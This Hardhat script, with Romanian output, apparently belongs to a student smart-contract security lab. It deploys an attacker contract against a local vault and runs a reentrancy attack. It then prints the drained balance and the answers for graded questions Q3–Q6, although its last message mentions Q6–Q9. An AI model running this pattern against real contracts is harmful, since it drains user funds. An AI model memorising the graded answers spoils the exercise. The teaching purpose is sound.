const fs = require("fs");
const path = require("path");
const hre = require("hardhat");

async function main() {
  const deploymentsDir = path.join(process.cwd(), "deployments");
  const vaultDataPath = path.join(deploymentsDir, "simple-vault.json");

  if (!fs.existsSync(vaultDataPath)) {
    throw new Error(
      "deployments/simple-vault.json not found.\n" +
        "Run first: npm run deploy:vault"
    );
  }

  const vaultData = JSON.parse(fs.readFileSync(vaultDataPath, "utf8"));
  const vaultAddr = vaultData.contractAddress;

  console.log("=== CHALLENGE 2: REENTRANCY ATTACK ===\n");
  console.log("Vault address:", vaultAddr);

  const balanceBefore = await hre.ethers.provider.getBalance(vaultAddr);
  console.log(
    "Vault balance INAINTE de atac:",
    hre.ethers.utils.formatEther(balanceBefore),
    "ETH\n"
  );

  console.log("--- Deploying attacker contract ---");
  const VaultAttacker = await hre.ethers.getContractFactory("VaultAttacker");
  const attacker = await VaultAttacker.deploy(vaultAddr);
  await attacker.deployed();
  console.log("Attacker deployed la:", attacker.address);

  const maxAtk = vaultData.attackHints
    ? vaultData.attackHints.suggestedMaxAttacks || 5
    : 5;
  await attacker.setMaxAttacks(maxAtk);
  console.log("Max reapelari setate:", maxAtk);

  const depositEth = vaultData.attackHints
    ? vaultData.attackHints.suggestedDepositEth || "1.0"
    : "1.0";

  console.log("\n--- Deposit ETH in vault ---");
  const depositTx = await attacker.depositToVault({
    value: hre.ethers.utils.parseEther(depositEth)
  });
  await depositTx.wait();
  console.log("Depus", depositEth, "ETH in vault prin contractul attacker");

  console.log("\n--- Lansare atac reentrancy ---");
  const attackTx = await attacker.attack();
  await attackTx.wait();
  console.log("Atac executat!\n");

  const balanceAfter = await hre.ethers.provider.getBalance(vaultAddr);
  const stolen = await attacker.getStolenAmount();
  const attackCount = await attacker.attackCount();

  console.log("=== REZULTATE ===\n");
  console.log(
    "Vault balance DUPA atac:",
    hre.ethers.utils.formatEther(balanceAfter),
    "ETH"
  );
  console.log(
    "ETH furati de attacker:",
    hre.ethers.utils.formatEther(stolen),
    "ETH"
  );
  console.log("Numar reapelari (reentrancy loops):", attackCount.toString());

  function fmt4(wei) {
    return parseFloat(hre.ethers.utils.formatEther(wei)).toFixed(4);
  }

  console.log("\n=== VALORILE PENTRU JSON (Q3-Q6) ===\n");
  console.log("Q3  vaultAddress:             ", vaultAddr);
  console.log("Q4  initialVaultBalanceEth:   ", fmt4(balanceBefore));
  console.log("Q5  attackerContractAddress:  ", attacker.address);
  console.log("Q6  finalVaultBalanceEth:     ", fmt4(balanceAfter));

  const attackDataPath = path.join(deploymentsDir, "attack-results.json");
  const attackData = {
    vaultAddress: vaultAddr,
    attackerAddress: attacker.address,
    initialVaultBalanceEth: fmt4(balanceBefore),
    finalVaultBalanceEth: fmt4(balanceAfter),
    stolenEth: hre.ethers.utils.formatEther(stolen),
    attackCount: attackCount.toString()
  };

  fs.writeFileSync(attackDataPath, `${JSON.stringify(attackData, null, 2)}\n`);
  console.log("\nDate salvate in:", path.relative(process.cwd(), attackDataPath));
  console.log(
    "\nCopiaza valorile Q6-Q9 in student/submissions/challenge2-results.json"
  );
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
